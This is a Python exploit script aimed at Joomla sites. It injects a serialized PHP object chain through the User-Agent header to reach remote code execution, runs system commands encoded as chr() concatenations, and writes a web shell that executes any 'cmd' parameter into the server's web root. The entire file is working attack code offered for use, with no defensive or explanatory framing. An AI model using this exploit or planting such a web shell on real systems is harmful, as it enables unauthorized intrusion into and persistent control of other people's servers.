 
import sys
import requests

# Convert string to chr(xx).chr(xx) for use in php
def encode_string_to_char_concat(string):
    encoded = ""
    for char in string:
        # convert char to ascii code
        ascii = ord(char)
        encoded += "chr({0}).".format(ascii)
 
    return encoded[:-1]

# make use of the exploit template
def generate_injection_payload(payload):
    injected_payload = "{};JFactory::getConfig();exit".format(payload)    
    terminator = '\xf0\xfd\xfd\xfd';

    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminator
 
    return exploit_template

# http get request
def get(url, headers):
    cookies = requests.get(url,headers=headers).cookies
    return requests.get(url, headers=headers,cookies=cookies)    

# inject system command to defined url
def inject_command(url, cmd):
    system_cmd = 'system("{}");'.format(cmd)
    encoded_cmd = encode_string_to_char_concat(system_cmd)

    headers = {
        'User-Agent': generate_injection_payload('eval({})'.format(encoded_cmd))
    }

    return get(url, headers)

# Execution
filename = '/var/www/html/public_shell.php'

url = sys.argv[1]
print("Requested URL: {}".format(url))

print('\nCreate file:')
print(inject_command(url, "touch {}".format(filename)))

file_content = "<?php \$cmd=\$_GET[\'cmd\']; echo system(\$cmd);?>"

php_command = 'echo \'{0}\' > {1}'.format(file_content, filename)
print('\nWrite php to file:')
print(inject_command(url, php_command))